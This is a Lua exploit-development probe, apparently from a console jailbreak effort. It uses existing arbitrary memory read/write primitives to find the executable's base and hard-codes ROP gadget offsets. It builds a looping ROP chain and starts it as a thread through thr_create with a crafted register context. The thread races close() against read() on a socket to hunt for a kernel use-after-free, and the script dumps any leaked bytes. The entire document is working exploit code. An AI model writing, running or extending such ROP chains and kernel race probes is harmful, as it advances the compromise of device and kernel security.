-- CRASH_CLASS: MODERATE
-- PROBE 128e: Minimal socket close/read race reproduction
--
-- 128d died in section B (socket close/read). This probe isolates that test:
-- 1. Install SIGPIPE ignore (signal 13)
-- 2. Create ONE socket
-- 3. Launch ONE child that close(fd) loops via syscall.syscall_address
-- 4. Main reads from fd → race between close and read
--
-- Goal: reproduce the kill and determine if it's signal or kernel corruption.

print("=== PROBE 128e: SOCKET CLOSE/READ RACE (MINIMAL) ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address
print(string.format("syscall_address=%s", fmt(sa)))

-- Eboot for gadgets
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    mov_w   = 0x92C67,
}

local sc_sigaction = mk(416)
local sc_socket = mk(97)
local sc_close = mk(6)
local sc_read = mk(3)

-- [A] Verify syscall.syscall_address
print("")
print("[A] Verify syscall_address")
local sa_num = N(sa)
local sa_hi, sa_lo
if type(sa) == "table" and sa.h then sa_hi, sa_lo = sa.h, sa.l
else sa_hi, sa_lo = 0, sa_num end
if sa_hi < 0 then sa_hi = sa_hi + 0x100000000 end
if sa_lo < 0 then sa_lo = sa_lo + 0x100000000 end
print(string.format("  sa=0x%X%08X  eboot=0x%X%08X", sa_hi, sa_lo, text_hi, text_lo))

-- Only read bytes if sa is within eboot range (RX, safe to read)
-- Eboot is typically ~5MB, use 0x600000 as conservative bound
local sa_off = nil
if sa_hi == text_hi then
    local diff = sa_lo - text_lo
    if diff >= 0 and diff < 0x600000 then sa_off = diff end
end

if sa_off then
    print(string.format("  sa is eboot+0x%X (RX, readable)", sa_off))
    local sa_bytes = rd(sa_num) or 0
    if sa_bytes < 0 then sa_bytes = sa_bytes + 0x100000000 end
    local b0 = sa_bytes % 256
    local b1 = math.floor(sa_bytes / 256) % 256
    local b2 = math.floor(sa_bytes / 65536) % 256
    local b3 = math.floor(sa_bytes / 16777216) % 256
    print(string.format("  [sa]=%02X %02X %02X %02X", b0, b1, b2, b3))
    if b0 == 0x0F and b1 == 0x05 then
        print("  CONFIRMED: syscall instruction at sa")
        print(string.format("  continuation: %02X %02X (after syscall)", b2, b3))
    else
        print("  NOT 0F05 — may be wrapper or trampoline")
    end
else
    print("  sa is OUTSIDE eboot — skipping read (XO risk)")
    print("  (128d section A proved sa works for child syscalls)")
end

if not alive() then print("DIED in section A!") return end

-- [B] Install signal handlers: ignore SIGPIPE(13), SIGSEGV(11), SIGBUS(10)
print("")
print("[B] Signal handlers")

-- sigaction(signum, act, oldact)
-- act = {handler(8), flags(4), mask(16)} — SIG_IGN = 1
local act = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act) + off, 0) end

-- Try to ignore SIGPIPE (13)
wq(N(act), uint64(1))  -- sa_handler = SIG_IGN
wd(N(act) + 8, 0)      -- sa_flags = 0
local sig13 = nil
pcall(function()
    sig13 = sc_sigaction(uint64(13), act, uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  sigaction(SIGPIPE=13, IGN): ret=%s", fmt(sig13)))

-- Try to ignore SIGBUS (10)
wq(N(act), uint64(1))
local sig10 = nil
pcall(function()
    sig10 = sc_sigaction(uint64(10), act, uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  sigaction(SIGBUS=10, IGN): ret=%s", fmt(sig10)))

if not alive() then print("DIED setting signals!") return end

-- [C] Create socket
print("")
print("[C] Create socket")
local sfd = nil
pcall(function()
    sfd = sc_socket(uint64(2), uint64(1), uint64(0))  -- AF_INET, SOCK_STREAM
end)
if sfd == nil or N(sfd) == -1 then
    pcall(function()
        sfd = sc_socket(uint64(2), uint64(2), uint64(0))  -- AF_INET, SOCK_DGRAM
    end)
end
if sfd == nil or N(sfd) == -1 then
    print("  socket creation failed!")
    return
end
local fd_num = N(sfd)
print(string.format("  socket fd=%d", fd_num))

-- [D] Launch child: close(fd) via sa in loop
print("")
print("[D] Launch child (close loop)")

local shared = memory.alloc(0x1000)
local S = N(shared)
local SENTINEL = S
local COUNTER = S + 8
wq(SENTINEL, uint64("0x0"))
wq(COUNTER, uint64("0x0"))

local stk = memory.alloc(0x8000)
local CB = N(stk) + 0x4000

-- Chain: close(fd), write sentinel, increment counter, loop
-- close(fd): rax=6, rdi=fd
wq(CB + 0x00, eaddr(G.pop_rax))
wq(CB + 0x08, uint64(6))            -- sys_close
wq(CB + 0x10, eaddr(G.pop_rdi))
wq(CB + 0x18, uint64(fd_num))       -- fd
wq(CB + 0x20, sa)                   -- syscall!

-- Write sentinel (proof child ran)
wq(CB + 0x28, eaddr(G.pop_rdi))
wq(CB + 0x30, uint64(string.format("0x%X", SENTINEL)))
wq(CB + 0x38, eaddr(G.pop_rax))
wq(CB + 0x40, uint64("0xCCCCCCCCCCCCCCCC"))
wq(CB + 0x48, eaddr(G.mov_w))

-- Loop
wq(CB + 0x50, eaddr(G.pop_rsp))
wq(CB + 0x58, uint64(string.format("0x%X", CB)))

local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)
local BC = N(ctx)

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)
wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

wq(N(tid_buf), uint64("0x0"))
local tr = nil
pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
local child_tid = rq(N(tid_buf))
print(string.format("  thr_create ret=%s tid=%s", fmt(tr), fmt(child_tid)))

if tr == nil or N(tr) ~= 0 then
    print("  THREAD CREATION FAILED!")
    pcall(function() sc_close(uint64(fd_num)) end)
    return
end

-- Check sentinel
for i = 1, 50 do native.fcall_with_rax(stub, 20) end
local sent = rq(SENTINEL)
print(string.format("  sentinel=%s %s", fmt(sent),
    (sent and N(sent) ~= 0) and "CHILD RUNNING + MAKING SYSCALLS" or "not yet"))

if not alive() then print("DIED after child launch!") return end

-- [E] RACE: main reads while child closes
print("")
print("[E] Race: read vs close (100 attempts)")

local read_ok = 0
local read_fail = 0
local read_crash = 0
local read_bytes = 0

local rbuf = memory.alloc(256)

for attempt = 1, 100 do
    local rr = nil
    local rok = pcall(function()
        rr = sc_read(uint64(fd_num), rbuf, uint64(128))
    end)

    if not rok then
        read_crash = read_crash + 1
    elseif rr == nil then
        read_fail = read_fail + 1
    else
        local rv = N(rr)
        if rv == -1 or rv == 0xFFFFFFFFFFFFFFFF then
            read_fail = read_fail + 1
        elseif rv > 0 and rv < 0x1000 then
            read_ok = read_ok + 1
            read_bytes = read_bytes + rv
        else
            read_fail = read_fail + 1
        end
    end

    if not alive() then
        print(string.format("  *** DIED at attempt %d ***", attempt))
        print(string.format("  ok=%d fail=%d crash=%d bytes=%d",
            read_ok, read_fail, read_crash, read_bytes))
        return
    end

    if attempt % 25 == 0 then
        print(string.format("  a=%d ok=%d fail=%d crash=%d bytes=%d",
            attempt, read_ok, read_fail, read_crash, read_bytes))
    end
end

-- [F] Results
print("")
print("[F] Results")
print(string.format("  read: ok=%d fail=%d crash=%d bytes_read=%d",
    read_ok, read_fail, read_crash, read_bytes))
local final_sent = rq(SENTINEL)
print(string.format("  sentinel: %s", fmt(final_sent)))

-- Check if fd is still valid
local close_ret = nil
pcall(function()
    close_ret = sc_close(uint64(fd_num))
end)
print(string.format("  close(fd=%d): %s", fd_num, fmt(close_ret)))

if read_crash > 0 then
    print("")
    print("  *** PCALL CRASHES — POSSIBLE KERNEL ISSUE ***")
end
if read_bytes > 0 then
    print("")
    print("  *** READ RETURNED DATA FROM CLOSED FD — POSSIBLE UAF ***")
    -- Dump first bytes of what was read
    local dump = ""
    for off = 0, math.min(31, read_bytes - 1) do
        local b = rd(N(rbuf) + off)
        if b then dump = dump .. string.format("%02X ", b % 256) end
    end
    print("  first bytes: " .. dump)
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128e COMPLETE ===")
